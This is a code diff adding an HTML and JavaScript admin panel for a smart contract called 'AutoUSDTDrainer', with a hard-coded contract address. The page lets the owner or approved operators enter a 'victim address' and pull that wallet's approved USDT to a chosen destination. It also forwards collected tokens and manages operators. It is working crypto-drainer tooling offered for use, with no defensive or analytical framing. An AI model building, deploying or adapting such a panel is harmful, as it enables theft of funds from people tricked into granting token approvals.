@@ -1,0 +1,498 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>AutoUSDTDrainer Admin Panel</title>
+    <script src="https://cdn.ethers.io/lib/ethers-5.7.2.umd.min.js"></script>
+    <style>
+        body { font-family: sans-serif; margin: 20px; background-color: #f4f7f6; color: #333; }
+        .container { max-width: 700px; margin: 40px auto; padding: 30px; border: 1px solid #e0e0e0; border-radius: 10px; box-shadow: 0 4px 12px rgba(0,0,0,0.08); background-color: #fff; }
+        h1, h2 { color: #0056b3; text-align: center; margin-bottom: 25px; }
+        hr { border: 0; height: 1px; background: #eee; margin: 30px 0; }
+        .section-title { font-size: 1.2em; font-weight: bold; margin-bottom: 15px; color: #0056b3; }
+        label { display: block; margin-bottom: 8px; font-weight: bold; color: #555; }
+        input[type="text"] { width: calc(100% - 24px); padding: 12px; margin-bottom: 20px; border: 1px solid #ccc; border-radius: 6px; font-size: 1em; box-sizing: border-box; }
+        button { padding: 12px 25px; background-color: #007bff; color: white; border: none; border-radius: 6px; cursor: pointer; font-size: 1.1em; transition: background-color 0.3s ease; display: block; width: 100%; box-sizing: border-box; }
+        button:hover:not(:disabled) { background-color: #0056b3; }
+        button:disabled { background-color: #cccccc; cursor: not-allowed; }
+        .status-message { margin-top: 25px; padding: 15px; border-radius: 6px; font-weight: bold; text-align: center; }
+        .success { background-color: #d4edda; color: #155724; border: 1px solid #c3e6cb; }
+        .error { background-color: #f8d7da; color: #721c24; border: 1px solid #f5c6cb; }
+        .info { background-color: #e2e3e5; color: #383d41; border: 1px solid #d6d8db; }
+        .wallet-info { background-color: #e9f7fe; border: 1px solid #b3e0ff; padding: 15px; border-radius: 6px; margin-bottom: 25px; text-align: center; }
+        .wallet-info strong { color: #0056b3; }
+        .function-group { margin-bottom: 30px; padding: 20px; border: 1px dashed #e0e0e0; border-radius: 8px; background-color: #fcfcfc; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>AutoUSDTDrainer Admin Panel</h1>
+        <p style="text-align: center; color: #666;">Interact with your deployed smart contract.</p>
+
+        <hr>
+
+        <div class="wallet-info">
+            <button id="connectWalletBtn">Connect Wallet</button>
+            <p id="walletAddressDisplay" style="margin-top: 15px;"><strong>Status:</strong> Not Connected</p>
+            <p id="networkDisplay" style="margin-top: 5px;"><strong>Network:</strong> Unknown</p>
+        </div>
+
+        <div id="status" class="status-message info">Please connect your wallet.</div>
+
+        <hr>
+
+        <div class="function-group">
+            <h2 class="section-title">Pull USDT Tokens</h2>
+            <p style="color: #555; margin-bottom: 20px;">This function transfers approved USDT from a victim to your specified destination.</p>
+            <div>
+                <label for="victimAddress">Victim Address (approved this contract):</label>
+                <input type="text" id="victimAddress" placeholder="e.g., 0xAbc...123">
+            </div>
+            <div>
+                <label for="destinationAddress">Destination Address (where to send USDT):</label>
+                <input type="text" id="destinationAddress" placeholder="e.g., Your receiving address">
+            </div>
+            <button id="pullUsdtBtn">Execute autoPullUSDT</button>
+        </div>
+
+        <div class="function-group">
+            <h2 class="section-title">Forward Contract's Collected USDT</h2>
+            <p style="color: #555; margin-bottom: 20px;">If USDT was sent directly to this contract, use this to forward it.</p>
+            <div>
+                <label for="forwardToAddress">Forward To Address:</label>
+                <input type="text" id="forwardToAddress" placeholder="e.g., Your receiving address">
+            </div>
+            <button id="forwardCollectedBtn">Execute forwardCollected</button>
+        </div>
+
+        <div class="function-group">
+            <h2 class="section-title">Manage Operators</h2>
+            <p style="color: #555; margin-bottom: 20px;">Add or remove addresses authorized to call `autoPullUSDT` (besides the owner).</p>
+            <div>
+                <label for="operatorAddress">Operator Address:</label>
+                <input type="text" id="operatorAddress" placeholder="e.g., 0xDef...456">
+            </div>
+            <div style="display: flex; gap: 10px;">
+                <button id="addOperatorBtn" style="width: 50%;">Add Operator</button>
+                <button id="removeOperatorBtn" style="width: 50%;">Remove Operator</button>
+            </div>
+        </div>
+
+        <div class="function-group">
+            <h2 class="section-title">Read Contract Data</h2>
+            <p style="color: #555; margin-bottom: 20px;">Check contract owner, balance, and token address.</p>
+            <div>
+                <button id="getContractInfoBtn">Get Contract Info</button>
+                <p style="margin-top: 15px;"><strong>Contract Owner:</strong> <span id="displayOwner">Loading...</span></p>
+                <p><strong>Contract USDT Balance:</strong> <span id="displayUSDTBalance">Loading...</span></p>
+                <p><strong>USDT Token Address:</strong> <span id="displayUSDTTokenAddress">Loading...</span></p>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // --- CONFIGURATION ---
+        const CONTRACT_ADDRESS = "0x8c8C07d9cc5aDCb443c7257ad43b01EB26a2636F"; // YOUR DEPLOYED CONTRACT ADDRESS
+        const CONTRACT_ABI = [
+            // Your provided ABI starts here
+            {
+                "inputs": [
+                    {
+                        "internalType": "address",
+                        "name": "operator",
+                        "type": "address"
+                    }
+                ],
+                "name": "addOperator",
+                "outputs": [],
+                "stateMutability": "nonpayable",
+                "type": "function"
+            },
+            {
+                "inputs": [
+                    {
+                        "internalType": "address",
+                        "name": "victim",
+                        "type": "address"
+                    },
+                    {
+                        "internalType": "address",
+                        "name": "destination",
+                        "type": "address"
+                    }
+                ],
+                "name": "autoPullUSDT",
+                "outputs": [],
+                "stateMutability": "nonpayable",
+                "type": "function"
+            },
+            {
+                "inputs": [
+                    {
+                        "internalType": "address",
+                        "name": "to",
+                        "type": "address"
+                    }
+                ],
+                "name": "forwardCollected",
+                "outputs": [],
+                "stateMutability": "nonpayable",
+                "type": "function"
+            },
+            {
+                "inputs": [
+                    {
+                        "internalType": "address",
+                        "name": "operator",
+                        "type": "address"
+                    }
+                ],
+                "name": "removeOperator",
+                "outputs": [],
+                "stateMutability": "nonpayable",
+                "type": "function"
+            },
+            {
+                "inputs": [],
+                "stateMutability": "nonpayable",
+                "type": "constructor"
+            },
+            {
+                "inputs": [],
+                "name": "contractUSDTBalance",
+                "outputs": [
+                    {
+                        "internalType": "uint256",
+                        "name": "",
+                        "type": "uint256"
+                    }
+                ],
+                "stateMutability": "view",
+                "type": "function"
+            },
+            {
+                "inputs": [
+                    {
+                        "internalType": "address",
+                        "name": "",
+                        "type": "address"
+                    }
+                ],
+                "name": "operators",
+                "outputs": [
+                    {
+                        "internalType": "bool",
+                        "name": "",
+                        "type": "bool"
+                    }
+                ],
+                "stateMutability": "view",
+                "type": "function"
+            },
+            {
+                "inputs": [],
+                "name": "owner",
+                "outputs": [
+                    {
+                        "internalType": "address",
+                        "name": "",
+                        "type": "address"
+                    }
+                ],
+                "stateMutability": "view",
+                "type": "function"
+            },
+            {
+                "inputs": [],
+                "name": "usdtToken",
+                "outputs": [
+                    {
+                        "internalType": "address",
+                        "name": "",
+                        "type": "address"
+                    }
+                ],
+                "stateMutability": "view",
+                "type": "function"
+            }
+        ]; // Your provided ABI ends here
+
+        // --- GLOBAL VARIABLES ---
+        let signer;
+        let contract;
+        let provider;
+        let currentConnectedAccount = null;
+        let contractOwnerAddress = null;
+
+        // --- DOM ELEMENTS ---
+        const connectWalletBtn = document.getElementById('connectWalletBtn');
+        const pullUsdtBtn = document.getElementById('pullUsdtBtn');
+        const forwardCollectedBtn = document.getElementById('forwardCollectedBtn');
+        const addOperatorBtn = document.getElementById('addOperatorBtn');
+        const removeOperatorBtn = document.getElementById('removeOperatorBtn');
+        const getContractInfoBtn = document.getElementById('getContractInfoBtn');
+
+        const walletAddressDisplay = document.getElementById('walletAddressDisplay');
+        const networkDisplay = document.getElementById('networkDisplay');
+        const victimAddressInput = document.getElementById('victimAddress');
+        const destinationAddressInput = document.getElementById('destinationAddress');
+        const forwardToAddressInput = document.getElementById('forwardToAddress');
+        const operatorAddressInput = document.getElementById('operatorAddress');
+        const statusDiv = document.getElementById('status');
+
+        const displayOwner = document.getElementById('displayOwner');
+        const displayUSDTBalance = document.getElementById('displayUSDTBalance');
+        const displayUSDTTokenAddress = document.getElementById('displayUSDTTokenAddress');
+
+        // --- HELPER FUNCTIONS ---
+        function setStatus(message, type = 'info') {
+            statusDiv.className = `status-message ${type}`;
+            statusDiv.textContent = message;
+        }
+
+        function toggleButtons(enable) {
+            pullUsdtBtn.disabled = !enable;
+            forwardCollectedBtn.disabled = !enable;
+            addOperatorBtn.disabled = !enable;
+            removeOperatorBtn.disabled = !enable;
+            getContractInfoBtn.disabled = !enable;
+        }
+
+        async function getNetworkName(chainId) {
+            switch (chainId) {
+                case 1: return "Ethereum Mainnet";
+                case 56: return "Binance Smart Chain Mainnet";
+                case 97: return "Binance Smart Chain Testnet";
+                case 137: return "Polygon Mainnet";
+                case 80001: return "Polygon Mumbai Testnet";
+                // Add more chains as needed
+                default: return `Chain ID: ${chainId}`;
+            }
+        }
+
+        // --- MAIN FUNCTIONS ---
+
+        async function connectWallet() {
+            if (typeof window.ethereum !== 'undefined') {
+                try {
+                    provider = new ethers.providers.Web3Provider(window.ethereum);
+                    const accounts = await provider.send("eth_requestAccounts", []);
+                    signer = provider.getSigner();
+                    currentConnectedAccount = accounts[0]; // Set the connected account
+
+                    const network = await provider.getNetwork();
+                    const networkName = await getNetworkName(network.chainId);
+
+                    walletAddressDisplay.textContent = `Connected: ${currentConnectedAccount}`;
+                    networkDisplay.textContent = `Network: ${networkName} (ID: ${network.chainId})`;
+                    
+                    contract = new ethers.Contract(CONTRACT_ADDRESS, CONTRACT_ABI, signer);
+
+                    await getContractInfo(); // Get owner and other info on connect
+
+                    if (contractOwnerAddress && currentConnectedAccount.toLowerCase() === contractOwnerAddress.toLowerCase()) {
+                        setStatus("Wallet connected! You are the contract owner.", 'success');
+                        toggleButtons(true);
+                    } else {
+                        setStatus(`Wallet connected. You are NOT the contract owner (${contractOwnerAddress}).`, 'info');
+                        // Allow pullUsdt if operator, but disable admin functions
+                        if (contract && currentConnectedAccount) {
+                            try {
+                                const isOperator = await contract.operators(currentConnectedAccount);
+                                if (isOperator) {
+                                    setStatus(`Wallet connected. You are an operator.`, 'info');
+                                    pullUsdtBtn.disabled = false; // Enable pull if operator
+                                } else {
+                                    pullUsdtBtn.disabled = true; // Disable pull if not owner/operator
+                                }
+                            } catch (opError) {
+                                console.error("Error checking operator status:", opError);
+                                setStatus("Wallet connected, but could not check operator status. Ensure ABI is correct.", 'error');
+                                toggleButtons(false);
+                            }
+                        }
+                        // Always disable owner-only buttons if not owner
+                        forwardCollectedBtn.disabled = true;
+                        addOperatorBtn.disabled = true;
+                        removeOperatorBtn.disabled = true;
+                    }
+
+
+                } catch (error) {
+                    console.error("Error connecting wallet:", error);
+                    setStatus(`Error connecting wallet: ${error.message || error.code || "Unknown error"}`, 'error');
+                    walletAddressDisplay.textContent = "Status: Not Connected";
+                    networkDisplay.textContent = "Network: Unknown";
+                    toggleButtons(false);
+                }
+            } else {
+                setStatus("MetaMask or similar wallet not detected! Please install it.", 'error');
+                toggleButtons(false);
+            }
+        }
+
+        async function executeTransaction(functionName, args, successMessage) {
+            if (!contract) {
+                setStatus("Please connect your wallet first.", 'error');
+                return;
+            }
+            if (!currentConnectedAccount || (currentConnectedAccount.toLowerCase() !== contractOwnerAddress.toLowerCase() && functionName !== 'autoPullUSDT')) {
+                 // For autoPullUSDT, we need to check operator status explicitly
+                 // For other functions, only owner is allowed.
+                if (functionName === 'autoPullUSDT') {
+                    try {
+                        const isOperator = await contract.operators(currentConnectedAccount);
+                        if (!isOperator && currentConnectedAccount.toLowerCase() !== contractOwnerAddress.toLowerCase()) {
+                             setStatus("Not authorized to call this function (neither owner nor operator).", 'error');
+                             return;
+                        }
+                    } catch (opCheckError) {
+                        console.error("Error checking operator status:", opCheckError);
+                        setStatus("Could not verify operator status. Transaction aborted.", 'error');
+                        return;
+                    }
+                } else {
+                    setStatus("You are not the contract owner to perform this action.", 'error');
+                    return;
+                }
+            }
+
+
+            try {
+                setStatus("Sending transaction...", 'info');
+                
+                const tx = await contract[functionName](...args);
+                setStatus(`Transaction sent! Hash: ${tx.hash}. Waiting for confirmation...`, 'info');
+                console.log("Transaction:", tx);
+                
+                await tx.wait();
+                setStatus(`${successMessage} Transaction confirmed! Hash: ${tx.hash}`, 'success');
+
+                // Refresh info after certain transactions
+                if (functionName === 'addOperator' || functionName === 'removeOperator' || functionName === 'forwardCollected') {
+                    getContractInfo();
+                }
+
+            } catch (error) {
+                console.error(`Error executing ${functionName}:`, error);
+                setStatus(`Error executing ${functionName}: ${error.message || error.code || "Unknown error"}`, 'error');
+            }
+        }
+
+        async function handlePullUsdt() {
+            const victim = victimAddressInput.value.trim();
+            const destination = destinationAddressInput.value.trim();
+
+            if (!ethers.utils.isAddress(victim)) {
+                setStatus("Invalid victim address.", 'error');
+                return;
+            }
+            if (!ethers.utils.isAddress(destination)) {
+                setStatus("Invalid destination address.", 'error');
+                return;
+            }
+            await executeTransaction('autoPullUSDT', [victim, destination], 'USDT Pull successful!');
+        }
+
+        async function handleForwardCollected() {
+            const to = forwardToAddressInput.value.trim();
+            if (!ethers.utils.isAddress(to)) {
+                setStatus("Invalid destination address for forwarding.", 'error');
+                return;
+            }
+            await executeTransaction('forwardCollected', [to], 'USDT Forward successful!');
+        }
+
+        async function handleAddOperator() {
+            const operator = operatorAddressInput.value.trim();
+            if (!ethers.utils.isAddress(operator)) {
+                setStatus("Invalid operator address.", 'error');
+                return;
+            }
+            await executeTransaction('addOperator', [operator], 'Operator added successfully!');
+        }
+
+        async function handleRemoveOperator() {
+            const operator = operatorAddressInput.value.trim();
+            if (!ethers.utils.isAddress(operator)) {
+                setStatus("Invalid operator address.", 'error');
+                return;
+            }
+            await executeTransaction('removeOperator', [operator], 'Operator removed successfully!');
+        }
+
+        async function getContractInfo() {
+            if (!contract) {
+                displayOwner.textContent = "N/A";
+                displayUSDTBalance.textContent = "N/A";
+                displayUSDTTokenAddress.textContent = "N/A";
+                return;
+            }
+
+            try {
+                // Get owner
+                contractOwnerAddress = await contract.owner();
+                displayOwner.textContent = contractOwnerAddress;
+
+                // Get USDT balance of the contract
+                const balanceWei = await contract.contractUSDTBalance();
+                // USDT typically has 18 decimals, like Ether
+                const balanceEth = ethers.utils.formatUnits(balanceWei, 18); 
+                displayUSDTBalance.textContent = `${balanceEth} USDT`;
+
+                // Get USDT token address stored in the contract
+                const usdtTokenAddr = await contract.usdtToken();
+                displayUSDTTokenAddress.textContent = usdtTokenAddr;
+
+                setStatus("Contract info loaded successfully.", 'info');
+
+            } catch (error) {
+                console.error("Error getting contract info:", error);
+                setStatus(`Error getting contract info: ${error.message || "Unknown error"}`, 'error');
+                displayOwner.textContent = "Error";
+                displayUSDTBalance.textContent = "Error";
+                displayUSDTTokenAddress.textContent = "Error";
+            }
+        }
+
+        // --- EVENT LISTENERS ---
+        connectWalletBtn.addEventListener('click', connectWallet);
+        pullUsdtBtn.addEventListener('click', handlePullUsdt);
+        forwardCollectedBtn.addEventListener('click', handleForwardCollected);
+        addOperatorBtn.addEventListener('click', handleAddOperator);
+        removeOperatorBtn.addEventListener('click', handleRemoveOperator);
+        getContractInfoBtn.addEventListener('click', getContractInfo);
+
+        // Initial setup on page load
+        window.addEventListener('load', () => {
+            if (typeof window.ethereum !== 'undefined') {
+                connectWallet();
+                // Listen for account changes
+                window.ethereum.on('accountsChanged', (accounts) => {
+                    if (accounts.length === 0) {
+                        setStatus("Wallet disconnected.", 'info');
+                        walletAddressDisplay.textContent = "Status: Not Connected";
+                        networkDisplay.textContent = "Network: Unknown";
+                        toggleButtons(false);
+                        currentConnectedAccount = null;
+                    } else {
+                        connectWallet(); // Reconnect to update info
+                    }
+                });
+                // Listen for network changes
+                window.ethereum.on('chainChanged', (chainId) => {
+                    connectWallet(); // Reconnect to update network info
+                });
+            } else {
+                setStatus("MetaMask not detected. Please install it to use this panel.", 'error');
+                toggleButtons(false);
+            }
+        });
+
+        // Disable buttons by default until wallet is connected and authorized
+        toggleButtons(false);
+
+    </script>
+</body>
+</html>
